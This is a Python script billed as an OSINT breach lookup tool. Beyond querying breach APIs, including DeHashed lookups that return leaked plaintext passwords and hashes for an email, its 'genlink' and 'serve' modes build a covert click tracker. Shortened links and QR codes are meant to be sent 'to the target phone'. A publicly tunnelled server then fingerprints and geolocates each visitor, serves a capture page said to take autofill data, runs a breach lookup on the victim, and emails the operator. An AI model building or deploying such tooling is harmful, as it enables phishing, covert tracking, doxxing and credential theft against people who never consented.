#!/usr/bin/env python3
"""
Breach Lookup Tool
------------------
Queries public breach APIs for an email / domain / URL,
prints a colored terminal report, and optionally emails the report.

Usage:
    python breach_lookup.py <email|url|domain>
    python breach_lookup.py user@example.com --email report@you.com
    python breach_lookup.py https://example.com --json
"""

import argparse
import json
import os
import re
import smtplib
import ssl
import sys
import urllib.parse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Any

try:
    import requests
except ImportError:
    print("[!] 'requests' required:  pip install requests")
    sys.exit(1)

# --------------------------------------------------------------------------- #
# Colors
# --------------------------------------------------------------------------- #
class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
    W = "\033[97m"; D = "\033[90m"; X = "\033[0m"
    BOLD = "\033[1m"


def banner() -> None:
    print(f"""{C.C}{C.BOLD}
  ┌─────────────────────────────────────────────┐
  │        B R E A C H   L O O K U P           │
  │        OSINT / Security tool                │
  └─────────────────────────────────────────────┘{C.X}
""")


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
EMAIL_RE = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")


def classify(target: str) -> str:
    if EMAIL_RE.match(target):
        return "email"
    if target.startswith(("http://", "https://")):
        return "url"
    return "domain"


def domain_of(target: str) -> str:
    if target.startswith(("http://", "https://")):
        return urllib.parse.urlparse(target).netloc.split(":")[0]
    if "@" in target:
        return target.split("@", 1)[1]
    return target


# --------------------------------------------------------------------------- #
# Lookup sources
# --------------------------------------------------------------------------- #
def lookup_hibp_email(email: str, api_key: str | None) -> list[dict]:
    """Have I Been Pwned — breachedaccount endpoint."""
    if not api_key:
        return [{"source": "HIBP", "status": "skip",
                 "detail": "No HIBP API key set (env HIBP_API_KEY)"}]
    try:
        r = requests.get(
            "https://haveibeenpwned.com/api/v3/breachedaccount/" + urllib.parse.quote(email),
            headers={"hibp-api-key": api_key, "user-agent": "BreachLookupTool"},
            params={"truncateResponse": "false"},
            timeout=15,
        )
        if r.status_code == 404:
            return [{"source": "HIBP", "status": "clean", "detail": "No breaches found"}]
        if r.status_code == 401:
            return [{"source": "HIBP", "status": "error", "detail": "Invalid API key"}]
        r.raise_for_status()
        breaches = r.json()
        return [
            {
                "source": "HIBP",
                "status": "hit",
                "name": b.get("Name"),
                "title": b.get("Title"),
                "domain": b.get("Domain"),
                "date": b.get("BreachDate"),
                "data_classes": b.get("DataClasses", []),
                "pwn_count": b.get("PwnCount"),
            }
            for b in breaches
        ]
    except requests.RequestException as e:
        return [{"source": "HIBP", "status": "error", "detail": str(e)}]


def lookup_leakix(email_or_domain: str, api_key: str | None) -> list[dict]:
    """LeakIX — search for exposed data mentioning the target."""
    headers = {"accept": "application/json"}
    if api_key:
        headers["api-key"] = api_key
    try:
        r = requests.get(
            "https://leakix.net/api/search",
            params={"q": email_or_domain, "scope": "leaks"},
            headers=headers,
            timeout=15,
        )
        r.raise_for_status()
        try:
            events = (r.json().get("events") or [])
        except ValueError:
            return [{"source": "LeakIX", "status": "skip",
                     "detail": "API key required (env LEAKIX_API_KEY)"}]
        return [
            {
                "source": "LeakIX",
                "status": "hit",
                "leak_id": e.get("leak_id"),
                "service": e.get("service"),
                "date": e.get("date"),
                "ip": e.get("ip"),
                "hostname": e.get("hostname"),
            }
            for e in events[:20]
        ] or [{"source": "LeakIX", "status": "clean", "detail": "No leaks found"}]
    except requests.RequestException as e:
        return [{"source": "LeakIX", "status": "error", "detail": str(e)}]


def lookup_dehashed(query: str, api_key: str | None, email: str) -> list[dict]:
    """DeHashed — requires paid API key + registered email."""
    if not api_key or not email:
        return [{"source": "DeHashed", "status": "skip",
                 "detail": "Set DEHASHED_API_KEY and DEHASHED_EMAIL"}]
    try:
        import base64
        creds = base64.b64encode(f"{email}:{api_key}".encode()).decode()
        r = requests.get(
            "https://api.dehashed.com/v2/search",
            params={"query": f"email:{query}"},
            headers={
                "Authorization": f"Basic {creds}",
                "Accept": "application/json",
            },
            timeout=20,
        )
        r.raise_for_status()
        entries = r.json().get("balance") and r.json().get("breaches") or []
        return [
            {
                "source": "DeHashed",
                "status": "hit",
                "email": b.get("email"),
                "username": b.get("username"),
                "password": b.get("password"),
                "hash": b.get("hash"),
                "database": b.get("database_name"),
            }
            for b in entries[:30]
        ] or [{"source": "DeHashed", "status": "clean", "detail": "No entries"}]
    except Exception as e:
        return [{"source": "DeHashed", "status": "error", "detail": str(e)}]


def lookup_urlscan(url: str) -> list[dict]:
    """urlscan.io — search for prior scans of the URL / domain."""
    try:
        domain = domain_of(url)
        r = requests.get(
            "https://urlscan.io/api/v1/search/",
            params={"q": f"domain:{domain}"},
            timeout=15,
        )
        r.raise_for_status()
        results = r.json().get("results", [])[:10]
        return [
            {
                "source": "urlscan",
                "status": "hit",
                "url": res.get("page", {}).get("url"),
                "domain": res.get("page", {}).get("domain"),
                "time": res.get("time"),
                "verdicts": res.get("verdicts", {}).get("overall", {}),
            }
            for res in results
        ] or [{"source": "urlscan", "status": "clean", "detail": "No scans found"}]
    except requests.RequestException as e:
        return [{"source": "urlscan", "status": "error", "detail": str(e)}]


def lookup_virustotal(domain: str, api_key: str | None) -> list[dict]:
    """VirusTotal — domain report."""
    if not api_key:
        return [{"source": "VirusTotal", "status": "skip",
                 "detail": "Set VT_API_KEY"}]
    try:
        r = requests.get(
            f"https://www.virustotal.com/api/v3/domains/{domain}",
            headers={"x-apikey": api_key},
            timeout=15,
        )
        if r.status_code == 404:
            return [{"source": "VirusTotal", "status": "clean",
                     "detail": "Domain not found"}]
        r.raise_for_status()
        attrs = r.json().get("data", {}).get("attributes", {})
        stats = attrs.get("last_analysis_stats", {})
        return [{
            "source": "VirusTotal",
            "status": "hit" if stats.get("malicious", 0) > 0 else "clean",
            "malicious": stats.get("malicious", 0),
            "suspicious": stats.get("suspicious", 0),
            "harmless": stats.get("harmless", 0),
            "reputation": attrs.get("reputation", 0),
        }]
    except requests.RequestException as e:
        return [{"source": "VirusTotal", "status": "error", "detail": str(e)}]


def lookup_hibp_password(password: str) -> list[dict]:
    """HIBP k-anonymity password range check (no key needed)."""
    import hashlib
    sha1 = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    try:
        r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=10)
        r.raise_for_status()
        for line in r.text.splitlines():
            h, count = line.strip().split(":")
            if h == suffix:
                return [{"source": "HIBP-Pw", "status": "hit",
                         "detail": f"Password seen {count} times in breaches"}]
        return [{"source": "HIBP-Pw", "status": "clean",
                 "detail": "Password not found in breach corpora"}]
    except Exception as e:
        return [{"source": "HIBP-Pw", "status": "error", "detail": str(e)}]


# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #
def run_lookups(target: str, pw: str | None) -> list[dict]:
    import os
    kind = classify(target)
    domain = domain_of(target)
    hibp_key = os.environ.get("HIBP_API_KEY")
    leakix_key = os.environ.get("LEAKIX_API_KEY")
    dehashed_key = os.environ.get("DEHASHED_API_KEY")
    dehashed_email = os.environ.get("DEHASHED_EMAIL")
    vt_key = os.environ.get("VT_API_KEY")

    results: list[dict] = []

    print(f"{C.Y}[*] Target  : {target}")
    print(f"[*] Type    : {kind}")
    print(f"[*] Domain  : {domain}{C.X}\n")

    if kind == "email":
        print(f"{C.D}[*] Querying HIBP …{C.X}")
        results += lookup_hibp_email(target, hibp_key)
        print(f"{C.D}[*] Querying LeakIX …{C.X}")
        results += lookup_leakix(target, leakix_key)
        print(f"{C.D}[*] Querying DeHashed …{C.X}")
        results += lookup_dehashed(target, dehashed_key, dehashed_email)

    elif kind == "url":
        print(f"{C.D}[*] Querying urlscan.io …{C.X}")
        results += lookup_urlscan(target)
        print(f"{C.D}[*] Querying VirusTotal …{C.X}")
        results += lookup_virustotal(domain, vt_key)
        print(f"{C.D}[*] Querying LeakIX …{C.X}")
        results += lookup_leakix(domain, leakix_key)

    else:  # domain
        print(f"{C.D}[*] Querying VirusTotal …{C.X}")
        results += lookup_virustotal(domain, vt_key)
        print(f"{C.D}[*] Querying urlscan.io …{C.X}")
        results += lookup_urlscan(target)
        print(f"{C.D}[*] Querying LeakIX …{C.X}")
        results += lookup_leakix(domain, leakix_key)

    if pw:
        print(f"{C.D}[*] Checking password against HIBP …{C.X}")
        results += lookup_hibp_password(pw)

    return results


def print_report(target: str, results: list[dict]) -> str:
    hits = [r for r in results if r.get("status") == "hit"]
    lines: list[str] = []

    print(f"\n{C.BOLD}{C.W}{'=' * 60}{C.X}")
    print(f"{C.BOLD}  R E S U L T S{C.X}")
    print(f"{C.BOLD}{C.W}{'=' * 60}{C.X}")

    for r in results:
        status = r.get("status", "?")
        if status == "hit":
            tag = f"{C.R}{C.BOLD}[HIT]{C.X}"
        elif status == "clean":
            tag = f"{C.G}[ OK ]{C.X}"
        elif status == "skip":
            tag = f"{C.Y}[SKIP]{C.X}"
        else:
            tag = f"{C.M}[ERR ]{C.X}"

        src = r.get("source", "?")
        print(f"\n  {tag} {C.C}{src}{C.X}")
        for k, v in r.items():
            if k in ("source", "status"):
                continue
            print(f"        {C.D}{k}:{C.X} {v}")
        lines.append(json.dumps(r, default=str))

    print(f"\n{C.BOLD}{C.W}{'=' * 60}{C.X}")
    summary = f"  Hits: {len(hits)}  |  Total checks: {len(results)}"
    color = C.R if hits else C.G
    print(f"{color}{C.BOLD}{summary}{C.X}")
    print(f"{C.BOLD}{C.W}{'=' * 60}{C.X}\n")

    return "\n".join(lines)


def send_email_report(
    target: str,
    report_text: str,
    smtp_host: str,
    smtp_port: int,
    smtp_user: str,
    smtp_pass: str,
    to_addr: str,
) -> bool:
    msg = MIMEMultipart("alternative")
    msg["Subject"] = f"[BreachLookup] Report for {target}"
    msg["From"] = smtp_user
    msg["To"] = to_addr

    plain = f"Breach Lookup Report\nTarget: {target}\n\n{report_text}"
    html = f"""<html><body style="font-family:monospace;background:#111;color:#eee;padding:20px">
<h2 style="color:#0ff">Breach Lookup Report</h2>
<p><b>Target:</b> {target}</p>
<pre style="background:#222;padding:12px;border:1px solid #444">{report_text}</pre>
</body></html>"""

    msg.attach(MIMEText(plain, "plain"))
    msg.attach(MIMEText(html, "html"))

    context = ssl.create_default_context()
    try:
        with smtplib.SMTP(smtp_host, smtp_port, timeout=20) as server:
            server.starttls(context=context)
            server.login(smtp_user, smtp_pass)
            server.sendmail(smtp_user, [to_addr], msg.as_string())
        print(f"{C.G}[+] Report emailed to {to_addr}{C.X}")
        return True
    except Exception as e:
        print(f"{C.R}[!] Email failed: {e}{C.X}")
        return False


# --------------------------------------------------------------------------- #
# Link generation + click server
# --------------------------------------------------------------------------- #
def gen_link(tunnel_url: str, target_hint: str = "") -> dict:
    """Shorten a URL with TinyURL (then optionally QR). Public API, no key."""
    long_url = tunnel_url + ("?q=" + urllib.parse.quote(target_hint) if target_hint else "")
    short = long_url
    try:
        r = requests.post(
            "https://tinyurl.com/api-create.php",
            data={"url": long_url},
            timeout=10,
        )
        if r.status_code == 200 and r.text.startswith("http"):
            short = r.text.strip()
    except requests.RequestException as e:
        print(f"{C.Y}[!] TinyURL failed ({e}) — using raw link{C.X}")

    qr_svg = None
    try:
        qr = requests.get(
            "https://api.qrserver.com/v1/create-qr-code/",
            params={"data": short, "size": "260x260", "margin": "12"},
            timeout=10,
        )
        if qr.status_code == 200 and qr.headers.get("Content-Type", "").startswith("image"):
            qr_svg = qr.content
    except requests.RequestException:
        pass

    return {"long": long_url, "short": short, "qr": qr_svg}


def serve_clicks(
    smtp_host: str, smtp_port: int, smtp_user: str, smtp_pass: str, to_addr: str,
) -> None:
    """Host a link; every click = fingerprint + breach lookup + terminal + email."""
    sys.stdout.reconfigure(line_buffering=True)
    from http.server import BaseHTTPRequestHandler, HTTPServer
    import ipaddress

    def geoip(ip: str) -> dict:
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
            r.raise_for_status()
            d = r.json()
            return {k: v for k, v in d.items() if v not in (None, "", "fail")}
        except Exception:
            return {}

    class Handler(BaseHTTPRequestHandler):
        def _serve_page(self):
            """Serve the client capture page (fingerprint + autofill + report POST)."""
            # load site/click.html next to this file
            here = os.path.dirname(os.path.abspath(__file__))
            page = os.path.join(here, "site", "click.html")
            if os.path.exists(page):
                with open(page, "rb") as f:
                    body = f.read()
            else:
                body = b"<h1>click.html not found - run from repo root</h1>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _report(self, info, hint=""):
            ip = info.get("ip", self.client_address[0])
            ua = info.get("user_agent", "")
            print(f"\n{C.R}{C.BOLD}[CLICK] {ip} — {info.get('device', '?')}{C.X}")
            for k, v in info.items():
                print(f"          {C.D}{k}:{C.X} {v}")

            report_lines = [f"{k}: {v}" for k, v in info.items()]

            if hint:
                print(f"{C.Y}[*] Running breach lookup for: {hint}{C.X}")
                results = run_lookups(hint, None)
                report_text = print_report(hint, results)
                report_lines.append("\n" + report_text)

            payload = json.dumps(info, indent=2)

            if smtp_user and smtp_pass and to_addr:
                subject = f"[BreachLookup] CLICK from {ip}"
                email_text = "\n".join(report_lines)
                email_html = f"""<html><body style="font-family:monospace;background:#111;color:#eee;padding:20px">
<h2 style="color:#f44">Link clicked</h2>
<pre style="background:#222;padding:12px;border:1px solid #555">{email_text}</pre></body></html>"""
                msg = MIMEMultipart("alternative")
                msg["Subject"] = subject
                msg["From"] = smtp_user
                msg["To"] = to_addr
                msg.attach(MIMEText(email_text, "plain"))
                msg.attach(MIMEText(email_html, "html"))
                try:
                    context = ssl.create_default_context()
                    with smtplib.SMTP(smtp_host, smtp_port, timeout=20) as s:
                        s.starttls(context=context)
                        s.login(smtp_user, smtp_pass)
                        s.sendmail(smtp_user, [to_addr], msg.as_string())
                    print(f"{C.G}[+] Click report emailed to {to_addr}{C.X}")
                except Exception as e:
                    print(f"{C.R}[!] Email failed: {e}{C.X}")

            with open("clicks.jsonl", "a") as f:
                f.write(payload + "\n")

        def _handle(self):
            path = urllib.parse.urlparse(self.path).path
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            hint = q.get("q", [""])[0]

            if self.command == "POST" and path.rstrip("/") in ("/report", "/api/report", "/capture"):
                length = int(self.headers.get("Content-Length", 0) or 0)
                raw = self.rfile.read(length) if length else b"{}"
                try:
                    info = json.loads(raw or b"{}")
                except json.JSONDecodeError:
                    info = {"raw": raw.decode("utf-8", "replace")[:2000]}
                # merge server-side truth (never trust client IP)
                server_ip = self.client_address[0]
                info.setdefault("ip", server_ip)
                if info.get("ip") != server_ip:
                    info["server_seen_ip"] = server_ip
                info.setdefault("time", __import__("datetime").datetime.now().isoformat())
                info.setdefault("user_agent", self.headers.get("User-Agent", ""))
                info.setdefault("referer", self.headers.get("Referer", ""))
                self._report(info, hint)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                body = b'{"ok":true}'
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            # GET: fingerprint server-side, serve capture page
            ip = self.client_address[0]
            ua = self.headers.get("User-Agent", "")
            ref = self.headers.get("Referer", "")
            info = {
                "ip": ip,
                "device": ua.split("(")[1].split(")")[0] if "(" in ua else ua[:60],
                "user_agent": ua,
                "referer": ref,
                "path": self.path,
                "time": __import__("datetime").datetime.now().isoformat(),
            }
            info.update(geoip(ip))
            if hint:
                self._report(info, hint)
            self._serve_page()

        do_GET = _handle
        do_POST = _handle
        do_PUT = _handle
        log_message = lambda *a, **k: None  # silence request logs

    port = int(os.environ.get("PORT", "8080"))
    srv = HTTPServer(("0.0.0.0", port), Handler)
    print(f"{C.B}{C.BOLD}[*] Click server live on ports {port}{C.X}")

    # local tunnel for public link (ngrok if present)
    tunnel = None
    if os.environ.get("PUBLIC_BASE"):
        tunnel = os.environ["PUBLIC_BASE"]
    else:
        import shutil, subprocess
        if shutil.which("ngrok"):
            proc = subprocess.Popen(
                ["ngrok", "http", str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import time
            time.sleep(4)
            try:
                r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
                tunnels = r.json().get("tunnels", [])
                if tunnels:
                    tunnel = tunnels[0]["public_url"]
            except Exception:
                pass
        elif shutil.which("cloudflared"):
            proc = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import time
            time.sleep(4)
            try:
                r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
                tunnels = r.json().get("tunnels", [])
                if tunnels:
                    tunnel = tunnels[0]["public_url"]
            except Exception:
                pass

    if tunnel:
        print(f"{C.BOLD}{C.G}[+] Public link : {tunnel}{C.X}")
        link = gen_link(tunnel)
        print(f"{C.BOLD}{C.G}[+] Short link  : {link['short']}{C.X}")
        if link["qr"]:
            with open("link_qr.png", "wb") as f:
                f.write(link["qr"])
            print(f"{C.B}[+] QR code     : link_qr.png (scan with target phone){C.X}")
    else:
        print(f"{C.Y}[*] No tunnel found. Install ngrok or cloudflared to get a public link,{C.X}")
        print(f"{C.Y}[*] or set PUBLIC_BASE=https://your-tunnel.example{C.X}")
        print(f"{C.D}[*] Local link   : http://127.0.0.1:{port}/{C.X}")

    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[*] Server stopped{C.X}")


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def main() -> None:
    p = argparse.ArgumentParser(description="Breach lookup OSINT tool")
    sub = p.add_subparsers(dest="cmd")

    # lookup: breach_lookup.py <email|url|domain>
    lk = sub.add_parser("lookup", help="run breach lookup on email/url/domain")
    lk.add_argument("target", help="email, URL, or domain to look up")
    lk.add_argument("--password", help="also check a password against HIBP")
    lk.add_argument("--email", help="send report to this address")
    lk.add_argument("--smtp-host", default="smtp.gmail.com")
    lk.add_argument("--smtp-port", type=int, default=587)
    lk.add_argument("--smtp-user", help="SMTP username (or env SMTP_USER)")
    lk.add_argument("--smtp-pass", help="SMTP password / app-password (or env SMTP_PASS)")
    lk.add_argument("--json", action="store_true", help="dump raw JSON to stdout")

    # genlink: breach_lookup.py genlink [--target EMAIL]
    gl = sub.add_parser("genlink", help="generate a clickable (shortened) link for the click server")
    gl.add_argument("--target", default="", help="optional email/domain to breach-check on click")
    gl.add_argument("--base", default=os.environ.get("PUBLIC_BASE", ""), help="your tunnel base URL")

    # serve: breach_lookup.py serve
    sv = sub.add_parser("serve", help="host the click link; each click → terminal + email report")
    sv.add_argument("--email", help="send click reports to this address")
    sv.add_argument("--smtp-host", default="smtp.gmail.com")
    sv.add_argument("--smtp-port", type=int, default=587)
    sv.add_argument("--smtp-user", help="SMTP username (or env SMTP_USER)")
    sv.add_argument("--smtp-pass", help="SMTP password (or env SMTP_PASS)")
    sv.add_argument("--port", type=int, default=int(os.environ.get("PORT", "8080")))

    args = p.parse_args()

    if args.cmd == "genlink":
        banner()
        base = args.base or input(f"{C.Y}[?] Tunnel base URL (e.g. https://abc.ngrok.io): {C.X}").strip()
        if not base:
            print(f"{C.R}[!] Need a base URL. Run 'serve' first or set PUBLIC_BASE.{C.X}")
            sys.exit(1)
        info = gen_link(base.rstrip("/"), args.target)
        print(f"{C.BOLD}{C.G}[+] Long URL : {info['long']}{C.X}")
        print(f"{C.BOLD}{C.G}[+] Short URL: {info['short']}{C.X}")
        if info["qr"]:
            with open("link_qr.png", "wb") as f:
                f.write(info["qr"])
            print(f"{C.B}[+] QR code  : link_qr.png — send this to the target phone{C.X}")
        sys.exit(0)

    if args.cmd == "serve":
        os.environ["PORT"] = str(args.port)
        banner()
        user = args.smtp_user or os.environ.get("SMTP_USER", "")
        pw = args.smtp_pass or os.environ.get("SMTP_PASS", "")
        serve_clicks(args.smtp_host, args.smtp_port, user, pw, args.email or "")
        return

    # default: legacy `python3 breach_lookup.py <target>`
    target = args.target if args.cmd == "lookup" else None
    if target is None and args.cmd is None:
        try:
            st = [a for a in sys.argv[1:] if not a.startswith("-")]
            target = st[0] if st else None
        except IndexError:
            target = None
    if not target:
        p.print_help()
        sys.exit(2)

    banner()
    results = run_lookups(target, getattr(args, "password", None))
    report = print_report(target, results)

    if getattr(args, "json", False) or any(a == "--json" for a in sys.argv[1:]):
        print(json.dumps(results, indent=2, default=str))

    to_addr = getattr(args, "email", None) or os.environ.get("REPORT_EMAIL", "")
    if to_addr:
        user = getattr(args, "smtp_user", None) or os.environ.get("SMTP_USER", "")
        pw = getattr(args, "smtp_pass", None) or os.environ.get("SMTP_PASS", "")
        if not user or not pw:
            print(f"{C.R}[!] Provide --smtp-user/--smtp-pass or SMTP_USER/SMTP_PASS env{C.X}")
        else:
            send_email_report(
                target, report,
                args.smtp_host if hasattr(args, "smtp_host") else "smtp.gmail.com",
                args.smtp_port if hasattr(args, "smtp_port") else 587,
                user, pw, to_addr,
            )

    sys.exit(1 if any(r.get("status") == "hit" for r in results) else 0)


if __name__ == "__main__":
    main()
